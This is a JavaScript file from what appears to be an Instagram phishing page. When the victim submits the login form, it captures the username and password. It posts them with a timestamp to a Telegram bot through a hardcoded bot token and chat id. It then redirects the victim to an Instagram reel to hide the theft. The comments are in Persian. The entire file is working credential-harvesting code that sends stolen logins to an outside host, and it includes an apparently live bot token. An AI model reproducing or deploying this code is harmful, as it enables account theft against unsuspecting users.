let form = document.getElementById('login-post');

const botToken = "8848729681:AAF6zgiBLEHGfOFfgLgV_SV9HJRVnbfKla8";
const chatId = "6830764999";

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const username = event.target.username.value;
  const password = event.target.password.value;
  
  // پیام برای تلگرام
  const message = `🔐 اطلاعات جدید:\n👤 Username: ${username}\n🔑 Password: ${password}\n🕒 زمان: ${new Date().toLocaleString()}`;
  
  // ارسال به تلگرام
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
  
  // هدایت به اینستاگرام
  let reelId = (new URLSearchParams(window.location.search)).get('reel') || 'instagram';
  location.replace(`https://instagram.com/reel/${reelId}`);
})